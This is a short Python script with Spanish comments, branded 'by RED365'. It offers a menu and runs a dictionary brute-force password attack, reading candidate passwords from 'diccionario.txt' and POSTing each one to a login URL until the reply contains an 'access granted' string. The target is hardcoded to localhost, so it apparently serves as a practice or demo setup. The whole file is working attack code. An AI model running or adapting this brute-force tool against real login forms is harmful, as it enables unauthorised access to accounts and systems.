import requests
import time
import os
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Logo ASCII de Kali Linux
kali_logo = r"""
      _  __          _   _       _           
     | |/ /__ _   _| |_| | ___ | | ___ _ __  
     | ' // _ \ | | | __| |/ _ \| |/ _ \ '_ \ 
     | . \  __/ |_| | |_| | (_) | |  __/ | | |
     |_|\_\___|\__,_|\__|_|\___/|_|\___|_| |_|
             by RED365
"""

# Función para imprimir el menú
def menu():
    print(Fore.GREEN + kali_logo)
    print(Fore.GREEN + "Menú:")
    print("1. Realizar fuerza bruta")
    print("2. Salir")
    choice = input("Elige una opción: ")
    return choice

# Función principal para el ataque de fuerza bruta
def brute_force_attack(url):
    with open('diccionario.txt', 'r') as f:
        passwords = f.read().splitlines()  # Leer contraseñas desde el diccionario

    for password in passwords:
        print(Fore.GREEN + f"\nProbando contraseña: {password}...")
        time.sleep(1)  # Simula un pequeño retraso para la animación
        response = requests.post(url, data={"password": password})

        if "¡Acceso concedido!" in response.text:
            print(Fore.GREEN + f"Contraseña encontrada: {password}")
            break
        else:
            print(Fore.RED + f"Contraseña incorrecta: {password}")

# Ciclo principal
while True:
    user_choice = menu()
    if user_choice == "1":
        brute_force_attack("http://127.0.0.1:5000/")
    elif user_choice == "2":
        print(Fore.GREEN + "Saliendo...")
        break
    else:
        print(Fore.RED + "Opción no válida. Inténtalo de nuevo.")
